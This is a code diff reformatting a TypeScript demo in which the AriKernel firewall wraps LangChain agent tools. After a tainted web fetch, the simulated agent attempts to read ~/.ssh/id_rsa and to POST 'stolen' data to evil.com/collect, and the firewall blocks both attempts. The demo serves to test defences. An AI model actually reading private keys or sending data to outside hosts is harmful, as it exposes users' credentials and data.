@@ -21,20 +21,20 @@
  * Run: npx tsx examples/langchain-arikernel.ts
  */
 
-import { ToolCallDeniedError } from '@arikernel/core';
-import { createFirewall, type Firewall } from '@arikernel/runtime';
-import { resolve } from 'node:path';
+import { resolve } from "node:path";
+import { ToolCallDeniedError } from "@arikernel/core";
+import { type Firewall, createFirewall } from "@arikernel/runtime";
 
 // ── Colors ──────────────────────────────────────────────────────────
 
-const BOLD = '\x1b[1m';
-const DIM = '\x1b[2m';
-const GREEN = '\x1b[32m';
-const RED = '\x1b[31m';
-const YELLOW = '\x1b[33m';
-const CYAN = '\x1b[36m';
-const MAGENTA = '\x1b[35m';
-const RESET = '\x1b[0m';
+const BOLD = "\x1b[1m";
+const DIM = "\x1b[2m";
+const GREEN = "\x1b[32m";
+const RED = "\x1b[31m";
+const YELLOW = "\x1b[33m";
+const CYAN = "\x1b[36m";
+const MAGENTA = "\x1b[35m";
+const RESET = "\x1b[0m";
 
 // ── Firewall-wrapped tool helper ────────────────────────────────────
 
@@ -51,13 +51,13 @@ const RESET = '\x1b[0m';
 class ToolDeniedByFirewall extends Error {
 	constructor(public readonly reason: string) {
 		super(reason);
-		this.name = 'ToolDeniedByFirewall';
+		this.name = "ToolDeniedByFirewall";
 	}
 }
 
 function firewallTool(
 	firewall: Firewall,
-	toolClass: 'http' | 'file' | 'shell' | 'database',
+	toolClass: "http" | "file" | "shell" | "database",
 	action: string,
 	opts?: {
 		capabilityClass?: string;
@@ -66,11 +66,15 @@ function firewallTool(
 ) {
 	return async (parameters: Record<string, unknown>) => {
 		// Step 1: Request a capability token
-		const capClass = opts?.capabilityClass ?? (toolClass === 'shell' ? 'shell.exec' : `${toolClass}.${action === 'get' || action === 'read' || action === 'query' ? 'read' : 'write'}`);
+		const capClass =
+			opts?.capabilityClass ??
+			(toolClass === "shell"
+				? "shell.exec"
+				: `${toolClass}.${action === "get" || action === "read" || action === "query" ? "read" : "write"}`);
 		const grant = firewall.requestCapability(capClass as any);
 
 		if (!grant.granted) {
-			throw new ToolDeniedByFirewall(grant.reason ?? 'Capability denied');
+			throw new ToolDeniedByFirewall(grant.reason ?? "Capability denied");
 		}
 
 		// Step 2: Execute through the firewall
@@ -78,7 +82,7 @@ function firewallTool(
 			toolClass,
 			action,
 			parameters,
-			grantId: grant.grant!.id,
+			grantId: grant.grant?.id,
 			taintLabels: opts?.taintLabels,
 		});
 
@@ -107,27 +111,29 @@ function firewallTool(
  *   })
  */
 async function simulateLangChainAgent(firewall: Firewall) {
-	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
+	console.log(`${CYAN}${BOLD}${"=".repeat(60)}${RESET}`);
 	console.log(`${CYAN}${BOLD}  LangChain + AriKernel Integration Demo${RESET}`);
-	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);
+	console.log(`${CYAN}${BOLD}${"=".repeat(60)}${RESET}\n`);
 
 	console.log(`${DIM}This simulates a LangChain agent whose tools are wrapped with${RESET}`);
 	console.log(`${DIM}firewallTool(). The agent calls tools normally — the firewall${RESET}`);
 	console.log(`${DIM}enforces capabilities, taint, and behavioral rules transparently.${RESET}\n`);
 
 	// Define wrapped tools (these would be DynamicTool instances in real LangChain)
-	const httpGet = firewallTool(firewall, 'http', 'get');
+	const httpGet = firewallTool(firewall, "http", "get");
 	const httpGetTainted = (params: Record<string, unknown>) =>
-		firewallTool(firewall, 'http', 'get', {
-			taintLabels: [{
-				source: 'web',
-				origin: String(params.url ?? 'unknown'),
-				confidence: 0.9,
-				addedAt: new Date().toISOString(),
-			}],
+		firewallTool(firewall, "http", "get", {
+			taintLabels: [
+				{
+					source: "web",
+					origin: String(params.url ?? "unknown"),
+					confidence: 0.9,
+					addedAt: new Date().toISOString(),
+				},
+			],
 		})(params);
-	const fileRead = firewallTool(firewall, 'file', 'read');
-	const httpPost = firewallTool(firewall, 'http', 'post');
+	const fileRead = firewallTool(firewall, "file", "read");
+	const httpPost = firewallTool(firewall, "http", "post");
 
 	// ── Step 1: Agent fetches a webpage (allowed, tainted) ──────────
 
@@ -135,11 +141,17 @@ async function simulateLangChainAgent(firewall: Firewall) {
 	console.log(`${DIM}  LangChain tool: http_get("https://httpbin.org/html")${RESET}`);
 
 	try {
-		await httpGetTainted({ url: 'https://httpbin.org/html' });
-		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${GREEN}— HTTP GET with web taint label applied${RESET}`);
+		await httpGetTainted({ url: "https://httpbin.org/html" });
+		console.log(
+			`  ${GREEN}${BOLD}ALLOWED${RESET} ${GREEN}— HTTP GET with web taint label applied${RESET}`,
+		);
 	} catch (err) {
-		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
-			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
+		const reason =
+			err instanceof ToolCallDeniedError
+				? err.decision.reason
+				: err instanceof ToolDeniedByFirewall
+					? err.reason
+					: String(err);
 		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
 	}
 	console.log(`  ${DIM}Restricted: ${firewall.isRestricted}${RESET}\n`);
@@ -152,11 +164,15 @@ async function simulateLangChainAgent(firewall: Firewall) {
 	console.log(`${DIM}  web taint (step 1) → sensitive file read (step 2)${RESET}`);
 
 	try {
-		await fileRead({ path: '~/.ssh/id_rsa' });
+		await fileRead({ path: "~/.ssh/id_rsa" });
 		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${GREEN}— (unexpected)${RESET}`);
 	} catch (err) {
-		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
-			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
+		const reason =
+			err instanceof ToolCallDeniedError
+				? err.decision.reason
+				: err instanceof ToolDeniedByFirewall
+					? err.reason
+					: String(err);
 		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
 	}
 
@@ -168,45 +184,51 @@ async function simulateLangChainAgent(firewall: Firewall) {
 			console.log(`  ${MAGENTA}Reason:  ${qi.reason}${RESET}`);
 		}
 	}
-	console.log('');
+	console.log("");
 
 	// ── Step 3: Agent tries to exfiltrate (blocked by quarantine) ────
 
-	console.log(`${YELLOW}${BOLD}[Step 3]${RESET} ${BOLD}Agent tries HTTP POST to exfiltrate${RESET}`);
+	console.log(
+		`${YELLOW}${BOLD}[Step 3]${RESET} ${BOLD}Agent tries HTTP POST to exfiltrate${RESET}`,
+	);
 	console.log(`${DIM}  LangChain tool: http_post("https://evil.com/collect")${RESET}`);
 	console.log(`${DIM}  The run is quarantined — all non-read-only actions are blocked.${RESET}`);
 
 	try {
-		await httpPost({ url: 'https://evil.com/collect', body: { stolen: 'data' } });
+		await httpPost({ url: "https://evil.com/collect", body: { stolen: "data" } });
 		console.log(`  ${GREEN}${BOLD}ALLOWED${RESET} ${RED}— this should NOT happen${RESET}`);
 	} catch (err) {
-		const reason = err instanceof ToolCallDeniedError ? err.decision.reason
-			: err instanceof ToolDeniedByFirewall ? err.reason : String(err);
+		const reason =
+			err instanceof ToolCallDeniedError
+				? err.decision.reason
+				: err instanceof ToolDeniedByFirewall
+					? err.reason
+					: String(err);
 		console.log(`  ${RED}${BOLD}DENIED${RESET} ${RED}— ${reason}${RESET}`);
 	}
-	console.log('');
+	console.log("");
 
 	// ── Summary ──────────────────────────────────────────────────────
 
-	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}`);
+	console.log(`${CYAN}${BOLD}${"=".repeat(60)}${RESET}`);
 	console.log(`${CYAN}${BOLD}  Results${RESET}`);
-	console.log(`${CYAN}${BOLD}${'='.repeat(60)}${RESET}\n`);
+	console.log(`${CYAN}${BOLD}${"=".repeat(60)}${RESET}\n`);
 
 	const events = firewall.getEvents();
 	for (const event of events) {
-		if (event.toolCall.toolClass === '_system') {
+		if (event.toolCall.toolClass === "_system") {
 			console.log(
 				`  ${DIM}#${event.sequence}${RESET} ${MAGENTA}${BOLD}QUARANTINE${RESET} ` +
-				`${MAGENTA}${event.decision.reason}${RESET}`,
+					`${MAGENTA}${event.decision.reason}${RESET}`,
 			);
 		} else {
 			const verdict = event.decision.verdict;
-			const color = verdict === 'allow' ? GREEN : RED;
-			const label = verdict === 'allow' ? 'ALLOW' : 'DENY ';
+			const color = verdict === "allow" ? GREEN : RED;
+			const label = verdict === "allow" ? "ALLOW" : "DENY ";
 			console.log(
 				`  ${DIM}#${event.sequence}${RESET} ${color}${BOLD}${label}${RESET} ` +
-				`${event.toolCall.toolClass}.${event.toolCall.action} ` +
-				`${DIM}${event.decision.reason.slice(0, 60)}${RESET}`,
+					`${event.toolCall.toolClass}.${event.toolCall.action} ` +
+					`${DIM}${event.decision.reason.slice(0, 60)}${RESET}`,
 			);
 		}
 	}
@@ -214,8 +236,10 @@ async function simulateLangChainAgent(firewall: Firewall) {
 	const replay = firewall.replay();
 	if (replay) {
 		const valid = replay.integrity.valid;
-		console.log(`\n  ${DIM}Events: ${replay.events.length}  |  ` +
-			`Hash chain: ${valid ? `${GREEN}VALID` : `${RED}BROKEN`}${RESET}`);
+		console.log(
+			`\n  ${DIM}Events: ${replay.events.length}  |  ` +
+				`Hash chain: ${valid ? `${GREEN}VALID` : `${RED}BROKEN`}${RESET}`,
+		);
 	}
 
 	console.log(`\n${DIM}The LangChain agent never knew about the firewall.`);
@@ -230,22 +254,22 @@ async function simulateLangChainAgent(firewall: Firewall) {
 // ── Main ────────────────────────────────────────────────────────────
 
 async function main() {
-	const policyPath = resolve(import.meta.dirname ?? '.', '..', 'policies', 'safe-defaults.yaml');
-	const auditPath = resolve(import.meta.dirname ?? '.', '..', 'demo-langchain-audit.db');
+	const policyPath = resolve(import.meta.dirname ?? ".", "..", "policies", "safe-defaults.yaml");
+	const auditPath = resolve(import.meta.dirname ?? ".", "..", "demo-langchain-audit.db");
 
 	const firewall = createFirewall({
 		principal: {
-			name: 'langchain-agent',
+			name: "langchain-agent",
 			capabilities: [
 				{
-					toolClass: 'http',
-					actions: ['get', 'post'],
-					constraints: { allowedHosts: ['httpbin.org', 'evil.com'] },
+					toolClass: "http",
+					actions: ["get", "post"],
+					constraints: { allowedHosts: ["httpbin.org", "evil.com"] },
 				},
 				{
-					toolClass: 'file',
-					actions: ['read'],
-					constraints: { allowedPaths: ['./data/**'] },
+					toolClass: "file",
+					actions: ["read"],
+					constraints: { allowedPaths: ["./data/**"] },
 				},
 			],
 		},
